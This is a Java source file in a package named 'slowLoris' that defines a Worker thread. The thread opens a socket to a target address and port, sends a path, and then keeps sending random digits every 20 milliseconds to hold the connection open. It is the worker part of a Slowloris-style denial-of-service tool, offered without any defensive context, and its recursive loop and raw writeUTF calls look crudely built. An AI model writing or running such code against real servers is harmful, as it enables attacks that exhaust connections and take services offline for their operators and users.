package slowLoris;
import java.net.*;
import java.io.*;
import java.util.*;
class Worker extends Thread{
  public Socket socket;
  public String path;
  public boolean active;
  public Worker(String address,int port, String path) throws UnknownHostException{
    try{
      this.socket = new Socket(address,port);
    }catch(Exception e){
      System.out.println(e);
    }
    this.path = path;
  }
  public void run(){
    this.active = true;

    try{
      DataOutputStream out = new DataOutputStream(socket.getOutputStream());
      out.writeUTF(this.path);
      spam(out);
    } catch (IOException e){
      System.out.println(e);
      this.active = false;
    }
  }
  public void spam(DataOutputStream out){
    try{
      Thread.sleep(20);
    }catch(InterruptedException e){
      System.out.println(e);
      this.active = false;
    }
    Random r = new Random();
    try{
      out.writeUTF(Integer.toString(r.nextInt(9)));
    }catch(IOException e){
      System.out.println(e);
      this.active = false;
    }
    spam(out);
  }
}
